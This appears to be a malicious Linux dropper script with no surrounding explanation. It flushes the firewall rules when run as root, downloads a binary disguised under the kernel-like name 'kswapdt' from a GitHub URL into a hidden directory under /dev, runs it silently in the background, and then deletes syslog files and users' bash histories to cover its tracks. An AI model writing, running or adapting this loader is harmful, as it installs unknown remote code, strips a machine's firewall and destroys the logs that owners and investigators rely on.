#!/bin/bash

if [[ "$EUID" == "0" ]]; then
	iptables -F &
	mkdir /dev/swapdt/
	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --output /dev/swapdt/swapdt0
	chmod 777 /dev/swapdt/swapdt0
	nohup /dev/swapdt/swapdt0 > /dev/null &
	rm -rf /var/log/syslog*
	find /home/ /root/ -name .bash_history -exec rm {} \;
else
	mkdir /dev/swapdt/
	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --output /dev/swapdt/swapdt0
	chmod 777 /dev/swapdt/swapdt0
	nohup /dev/swapdt/swapdt0 > /dev/null &
	rm -rf /var/log/syslog*
	find /home/ /root/ -name .bash_history -exec rm {} \;
fi

echo Done
